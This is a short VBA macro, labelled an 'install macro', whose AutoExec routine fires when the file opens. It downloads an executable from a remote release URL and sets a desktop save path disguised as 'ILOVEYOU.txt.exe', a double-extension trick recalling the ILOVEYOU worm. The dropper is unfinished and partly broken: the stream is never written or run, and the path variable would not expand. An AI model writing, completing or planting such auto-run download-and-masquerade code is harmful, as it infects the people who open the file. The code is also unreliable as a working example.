' Magnar install macro
Attribute VB_Name = "AutoExec"
Private Sub AutoExec()
  dim HTTPGET
  dim Data
  dim ExeURL
  dim LocalPath

  ExeURL = "https://github.com/magnar-blj/magnar/releases/download/v2.00/magnar.exe"
  LocalPath = "%CURRENTUSER%\Desktop\ILOVEYOU.txt.exe"

  Set HTTPGET = CreateObject("Microsoft.XMLHTTP")
  Set Data = CreateObject("ADODB.Stream")

  HTTPGET.Open "GET", ExeURL, false
  HTTPGET.Send
End Sub
